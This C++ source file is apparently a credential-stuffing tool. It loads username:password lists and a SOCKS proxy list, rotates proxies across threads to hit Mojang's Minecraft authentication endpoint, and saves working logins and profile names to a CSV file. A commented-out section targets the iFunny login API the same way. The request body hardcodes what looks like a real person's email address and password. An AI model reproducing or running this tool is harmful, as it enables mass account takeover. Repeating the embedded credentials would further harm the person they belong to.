#include <vector>
#include <fstream>
#include <thread>
#include <iostream>
#include "Queue.h"
#include <stdint.h>
#include <cctype>
#include <cstdint>
#include <iomanip>
#include <sstream>
#include <unistd.h>
#include "curl/curl.h"
#include "json.hpp"
using json = nlohmann::json;

size_t writeFunction(void* ptr, size_t size, size_t nmemb, std::string* data) {
	data->append(static_cast<char*>(ptr), size * nmemb);
	return size * nmemb;
}

class QueuePushClass{
public:
	int ProxyArraysize;
	std::string Account;
	std::string Username;
	std::string Password;
	std::string *ProxyArray;
	size_t (*writeFunction)(void*, size_t, size_t, std::string*);
};


class Threader {
private:
	Queue<QueuePushClass> QueueSystem;
	std::vector<std::thread> __Threads;
	int ThreadCount;

public:
	Threader(int Threadcount) {
		if (Threadcount < 1){ std::cout << "Threadcount Must Be Greater Than 1!\n"; }
		this->ThreadCount = Threadcount;
	}

	void __FinalFunc(QueuePushClass *var) {
		
		//return;
		if (!var){
			return;
		}
		//std::cout << "Api: " << var->Thzis->__API_BASE << "\n";

		
	
		
		//cpr::Proxies{{"https", var->ProxyArray[(rand() % var->ProxyArraysize)]}}

		
		while (true) {

			CURL *curl = curl_easy_init();

			struct curl_slist *headers = NULL;

			std::string response_string;

			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, var->writeFunction);
			curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);

			headers = curl_slist_append(headers, "User-Agent: MCU-Yggdrasil/1.0");
			headers = curl_slist_append(headers, "Content-Type: application/json; charset=utf-8");
			headers = curl_slist_append(headers, "Content-Language: en-US");
			curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);



			curl_easy_setopt(curl, CURLOPT_URL, "https://authserver.mojang.com/authenticate");

			curl_easy_setopt(curl, CURLOPT_NOBODY, 0L);
			curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "POST");



			curl_easy_setopt(curl, CURLOPT_VERBOSE, 0);

			std::string lp = var->ProxyArray[(rand() % var->ProxyArraysize)];
			std::cout << lp << "\n";

			curl_easy_setopt(curl, CURLOPT_PROXY, lp.c_str());


			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "{\"agent\": {\"name\": \"Minecraft\",\"version\": 1},\"clientToken\":\"1\",\"username\": \"liciafaithful@hotmail.com\",\"password\": \"Awesome1\"}");


			CURLcode res = curl_easy_perform(curl);



			int response_code;
			curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);

			std::cout << response_code << "\n";
			if (response_code == 403){
				break;
			}
			else if (response_code == 200){
				json JSONvar = json::parse(response_string);
				std::ofstream outputFile("out.csv");
				outputFile << var->Username << "," << var->Password << "," << JSONvar["selectedProfile"]["name"] << ",";
				outputFile.close();

			}

			std::cout << response_code << "\n";









			curl_easy_cleanup(curl);

			
			//std::cout << "Element: " << rand() % sizeof(*ProxyArray) << "\n";
			//auto res = cpr::Post(cpr::Url{"https://api.ifunny.mobi/v4/oauth2/token"},
			//						cpr::Payload{{"grant_type", "Accept-Languagepassword"}, {"username", var->Username}, {"password", var->Password}},
			//						cpr::Header{},
			//						cpr::Verbose{1},
			//						cpr::Proxies{{t, v}}
			//						);
			/*
			std::cout << res.status_code << "\n";
			if (res.status_code == 200){
				std::ofstream myfile;
				myfile.open("mm.txt");
				myfile << var->Username << ";" << var->Password << "\n";
				myfile.close();
				break;
			}	
			else if (res.status_code == 400){
				break;
			}
			else if (res.status_code == 429){
				Token = IfunnyApi().GetAuthToken();
			}
			break;		
		
			*/
		}

	}

	void Run() {
		curl_global_init(CURL_GLOBAL_ALL);
		this->__CreateThreads();
		this->__SetQueue();
		this->__JoinThreads();
		
	}
	void __ThreadedFunction(int ID) {
		while (true) {
			//pointer return
			//this->QueueSystem.PrintQueue();
			this->__FinalFunc(this->QueueSystem.pop());
			//break;
		}
	}
private:

	void __CreateThreads() {
		for (int ThreadID = 0; ThreadID < ThreadCount; ThreadID++) {
			this->__Threads.push_back(std::thread(&Threader::__ThreadedFunction, this, ThreadID));
		}
	}
	void __JoinThreads() {
		for (auto &x: this->__Threads) {
			x.join();
		}
	}
	//Alt list
	void __SetQueue() {
		int *ProxyFileLength = new int;
		*ProxyFileLength = this->__FileLength("socks.txt");
		std::string *ProxyArray = this->__ReadProxies(*ProxyFileLength);
		std::vector<std::string> TempVector = this->__ReadAccounts();

		for (auto &x: TempVector) {
			QueuePushClass *var = new QueuePushClass;
			var->Account = x;
			//std::cout << x << "\n";
			var->ProxyArraysize = *ProxyFileLength;
			var->ProxyArray = ProxyArray;
			//var = this->SplitAccount(var, ":");
			var->writeFunction = writeFunction;
			var = this->SplitAccount(var);
			//std::cout << "Username: "<< var->Username <<"\nPassword: " << var->Password << "\n";
			//var->Thzis = this;
			this->QueueSystem.Push(var);
		}
		this->QueueSystem.PrintQueue();
		//

	}
	int __FileLength(std::string FileName){
		std::ifstream infile;
		infile.open("socks.txt");
		int Length = 0;
		std::string null;
		while(getline(infile,null)) {
			Length++;
		}
		infile.close();
		//std::cout << "Length: " << Length << "\n";
		return Length;
	}

	QueuePushClass * SplitAccount(QueuePushClass * var){
		std::string FirstPart = "";
		char const *Colon = ":";
		char const *SemiColon = ";";
		int fin = 0;
		for (char const &x: var->Account){
			if (x == *Colon || x == *SemiColon){
				fin = 1;
				continue;
			}
			if (fin) {
				//std::cout << "Fin\n";
				var->Password += x;
				continue;
			}

			var->Username += x;
		}
		if (!fin){
			
			var->Username = "";
			var->Password = "";
		}
		//std::cout << "Username: "<< var->Username <<"\nPassword: " << var->Password << "\n";
		return var;
	}


	std::string * __ReadProxies(int FileLengthAllo) {

		std::string FileName = "socks.txt";

		std::string *ProxyArray = new std::string[FileLengthAllo];

		std::ifstream infile;

		infile.open(FileName);
		std::string null;
		int i = 0;
		while(getline(infile,null)){
			null.erase(std::remove(null.end()-1, null.end(), '\r'), null.end());
			ProxyArray[i] = null;
			//std::cout << null << "\n";
			i++;
		}
		infile.close();
		return ProxyArray;
	}


	std::vector<std::string> __ReadAccounts() {

		std::string FileName = "10.txt";

		std::vector<std::string> ProxyArray;

		std::ifstream infile;

		infile.open(FileName);
		std::string null;
		while(getline(infile,null)){
			null.erase(std::remove(null.end()-1, null.end(), '\r'), null.end());
			ProxyArray.push_back(null);
			//std::cout << null << "\n";
		}
		infile.close();;
		return ProxyArray;
	}
};





